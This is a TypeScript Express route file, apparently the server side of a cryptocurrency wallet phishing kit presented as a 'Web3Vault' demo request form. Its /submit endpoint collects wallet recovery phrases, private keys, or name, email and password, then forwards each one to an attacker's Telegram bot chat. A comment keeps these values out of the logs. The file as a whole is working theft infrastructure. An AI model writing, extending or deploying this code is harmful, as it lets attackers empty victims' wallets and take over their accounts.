import { Router } from "express"

const router = Router()

type Submission = {
  type: "Recovery" | "Private key" | "Login"
  selectedWallet: string
  Recovery?: string
  Privatekey?: string
  fullName?: string
  email?: string
  password?: string
}

function textField(value: unknown, maxLength: number): string | null {
  if (typeof value !== "string") return null
  const trimmed = value.trim()
  return trimmed.length > 0 && trimmed.length <= maxLength ? trimmed : null
}

function parseSubmission(body: unknown): Submission | null {
  if (!body || typeof body !== "object" || Array.isArray(body)) return null
  const input = body as Record<string, unknown>
  const selectedWallet = textField(input.selectedWallet, 100)
  if (!selectedWallet) return null

  if (input.type === "Recovery") {
    const Recovery = textField(input.Recovery, 2000)
    return Recovery ? { type: "Recovery", selectedWallet, Recovery } : null
  }
  if (input.type === "Private key") {
    const Privatekey = textField(input.Privatekey, 200)
    return Privatekey ? { type: "Private key", selectedWallet, Privatekey } : null
  }
  if (input.type === "Login") {
    const fullName = textField(input.fullName, 120)
    const email = textField(input.email, 254)
    const password = textField(input.password, 200)
    if (!fullName || !email || !password) return null
    return { type: "Login", selectedWallet, fullName, email, password }
  }
  return null
}

function formatMessage(submission: Submission): string {
  const lines = [
    `Web3Vault — Demo request (${submission.type})`,
    `Time: ${new Date().toISOString()}`,
    `Selected wallet app: ${submission.selectedWallet}`,
  ]
  if (submission.type === "Recovery") lines.push(`Recovery:\n${submission.Recovery}`)
  if (submission.type === "Private key") lines.push(`Public address Private key: ${submission.Privatekey}`)
  if (submission.type === "Login") lines.push(
    `Full name: ${submission.fullName}`,
    `Email: ${submission.email}`,
    `Password: ${submission.password}`,
  )
  return lines.join("\n")
}

async function sendToTelegram(text: string): Promise<void> {
  const token = process.env.TELEGRAM_BOT_TOKEN
  const chatId = process.env.TELEGRAM_CHAT_ID
  if (!token || !chatId) throw new Error("Telegram delivery is not configured")

  const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: chatId, text }),
    signal: AbortSignal.timeout(10_000),
  })
  if (!response.ok) throw new Error(`Telegram returned HTTP ${response.status}`)
  const result = await response.json() as { ok?: boolean; error_code?: number }
  if (result.ok !== true) throw new Error(`Telegram rejected the message (code ${result.error_code ?? "unknown"})`)
}

router.post("/submit", async (req, res): Promise<void> => {
  const submission = parseSubmission(req.body)
  if (!submission) {
    res.status(400).json({ ok: false, error: "Please provide valid request details" })
    return
  }
  try {
    await sendToTelegram(formatMessage(submission))
    res.json({ ok: true })
  } catch (error) {
    // Never log the request body, Telegram token, or provider URL.
    req.log.error({ error: error instanceof Error ? error.message : "Unknown error" }, "Telegram delivery failed")
    res.status(502).json({ ok: false, error: "Telegram delivery failed" })
  }
})

export default router